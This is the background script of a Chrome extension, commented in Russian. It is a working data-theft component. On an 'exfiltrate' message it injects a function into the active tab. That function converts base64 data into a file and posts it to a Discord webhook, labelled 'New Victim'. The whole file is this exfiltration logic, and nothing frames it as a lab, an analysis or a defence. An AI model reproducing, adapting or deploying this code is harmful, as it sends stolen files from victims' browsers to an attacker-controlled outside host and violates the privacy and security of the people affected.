// background.js
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "exfiltrate") {
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
      if (!tabs[0]) {
        sendResponse({ success: false, error: "Нет активной вкладки" });
        return;
      }
      
      chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: sendToDiscordFromPage,
        args: [request.base64Data, request.webhookUrl, request.fileName]
      }).then((results) => {
        // executeScript возвращает массив результатов из функции
        const result = results[0]?.result;
        if (result && result.success) {
          sendResponse({ success: true });
        } else {
          sendResponse({ success: false, error: result?.error || "Неизвестная ошибка" });
        }
      }).catch((err) => {
        sendResponse({ success: false, error: err.message });
      });
    });
    return true; // <--- ВАЖНО! Говорим Chrome, что ответ будет асинхронным
  }
});

// Функция выполняется ВНУТРИ страницы (на активной вкладке)
async function sendToDiscordFromPage(base64Data, webhookUrl, fileName) {
  try {
    // Конвертируем base64 в Blob
    const res = await fetch(base64Data);
    const blob = await res.blob();

    const formData = new FormData();
    formData.append('files[0]', blob, fileName);
    formData.append('payload_json', JSON.stringify({
      content: `🦅 **New Victim**`,
      attachments: [{ id: 0, filename: fileName }]
    }));

    const response = await fetch(webhookUrl, { method: 'POST', body: formData });
    
    if (response.ok) {
      return { success: true };
    } else {
      // Читаем тело ошибки от Discord
      const errorText = await response.text();
      return { success: false, error: `Discord: ${response.status} - ${errorText}` };
    }
  } catch (e) {
    return { success: false, error: e.message };
  }
}